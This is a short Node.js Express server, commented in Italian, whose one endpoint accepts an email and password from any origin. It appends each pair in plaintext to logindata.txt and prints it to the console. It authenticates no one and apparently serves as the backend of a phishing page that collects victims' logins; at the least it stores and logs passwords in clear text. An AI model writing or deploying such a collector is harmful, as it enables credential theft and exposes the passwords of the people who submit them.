const express = require('express');
const fs = require('fs');
const cors = require('cors');

const app = express();
const PORT = 3000;

// Middleware
app.use(cors());
app.use(express.json());

// Endpoint per salvare i dati
app.post('/save-data', (req, res) => {
    const { email, password } = req.body;

    if (!email || !password) {
        return res.status(400).json({ error: 'Email e password sono obbligatorie.' });
    }

    // Salva i dati in un file
    const data = `Email: ${email}, Password: ${password}\n`;
    fs.appendFile('logindata.txt', data, (err) => {
        if (err) {
            console.error('Errore durante il salvataggio dei dati:', err);
            return res.status(500).json({ error: 'Errore interno del server.' });
        }
        console.log('Dati salvati:', data);
        res.json({ message: 'Dati salvati con successo!' });
    });
});

// Avvio del server
app.listen(PORT, () => {
    console.log(`Server in ascolto su http://localhost:${PORT}`);
});
